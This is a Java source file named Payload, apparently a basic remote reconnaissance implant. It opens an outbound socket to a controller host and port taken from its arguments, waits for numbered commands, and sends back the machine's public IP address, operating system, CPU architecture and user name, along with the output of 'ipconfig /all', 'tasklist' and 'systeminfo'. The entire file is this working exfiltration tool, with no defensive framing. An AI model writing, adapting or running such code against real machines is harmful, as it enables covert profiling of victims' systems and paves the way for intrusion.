/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package payload;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;


/**
 *
 * @author amine gasa
 */
public class Payload {

    /**
     * @param args the command line arguments
     */
    

    public static void main(String[] args) throws IOException {

        int port = 0;
        try {
            port = Integer.parseInt(args[1]);
        } catch (Exception e) {

        }
       //Socket  s = new Socket("192.168.1.200", 8080);
        Socket s=new Socket(/*vars[0]*/args[0],port);
        DataInputStream dis = new DataInputStream(s.getInputStream());
        DataOutputStream dos = new DataOutputStream(s.getOutputStream());

        String msgin = "", msgout = "";

        try {
            while (!msgin.equals("6")) {
                msgin = dis.readUTF();

                msgout = action(Integer.parseInt(msgin));
                dos.writeUTF(msgout);

            }
            s.close();
        } catch (Exception e) {

        }
    }

    private static String action(int msgin) throws IOException {
        String res = "";
        switch (msgin) {
            case 1: {
                res = "global ip : " + getGlobal_ip();
                break;
            }
            case 2: {
                res = get_os();
                break;
            }
            case 3: {
                res = "all interfaces : " + commandLine("ipconfig /all");
                break;
            }
            case 4: {
                res = "all list process : " + commandLine("tasklist");
                break;
            }
            case 5: {
                res = "all propoerties computer : " + commandLine("Systeminfo");
                break;
            }
            case 6: {
                res = "6";
                break;/*to close the connection*/

            }
            default: {
                res = "Wrong input ";
                break;
            }
        }
        return res;
    }

    static String commandLine(String cmd) {
        String s = "";
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            String s1;
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s1 = input.readLine()) != null) {
                s = s + s1 + "\n";

            }

        } catch (IOException ex) {
            Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);
        }
        return s;
    }

    static String getGlobal_ip() {
        String s = "";
        String url = "http://ipv4bot.whatismyipaddress.com/";
        try {
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(new URL(url).openStream()));
            s = br.readLine();

        } catch (IOException ex) {
            Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);
        }
        return s;
    }

    static String get_os() throws IOException {
        String sys_info = null;

        try {

            String os = System.getProperty("os.name");
            String os_arch = System.getProperty("sun.arch.data.model");
            String cpu_arch = System.getProperty("os.arch");
            String user_name = System.getProperty("user.name");
            sys_info = " os is : " + os + "\n os architecture :" + os_arch + "\n cpu architecture :" + cpu_arch + "\n user name : " + user_name;
        } catch (Exception ex) {
            Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);
        }

        return sys_info;
    }

}
